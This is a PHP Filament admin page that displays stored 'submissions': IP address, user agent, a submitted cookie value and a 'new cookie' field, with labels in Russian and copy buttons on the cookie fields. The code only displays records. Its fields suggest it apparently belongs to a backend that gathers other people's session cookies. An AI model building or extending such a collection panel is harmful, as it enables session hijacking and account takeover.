<?php

namespace App\Filament\Resources\SubmissionResource\Pages;

use App\Filament\Resources\SubmissionResource;
use Filament\Infolists\Components\TextEntry;
use Filament\Resources\Pages\ViewRecord;
use Filament\Schemas\Components\Section;
use Filament\Schemas\Schema;

class ViewSubmission extends ViewRecord
{
    protected static string $resource = SubmissionResource::class;

    public function infolist(Schema $schema): Schema
    {
        return $schema->components([
            Section::make('Детали заявки')->schema([
                TextEntry::make('id')->label('ID'),
                TextEntry::make('ip_address')->label('IP адрес')->copyable(),
                TextEntry::make('created_at')->label('Дата')->dateTime('d.m.Y H:i:s'),
                TextEntry::make('user_agent')->label('User Agent')->columnSpanFull(),
                TextEntry::make('content')
                    ->label('Содержимое (cookie)')
                    ->fontFamily('mono')
                    ->copyable()
                    ->columnSpanFull(),
                TextEntry::make('new_cookie')
                    ->label('Новый кук')
                    ->fontFamily('mono')
                    ->copyable()
                    ->placeholder('не получен')
                    ->columnSpanFull(),
            ])->columns(3),
        ]);
    }
}
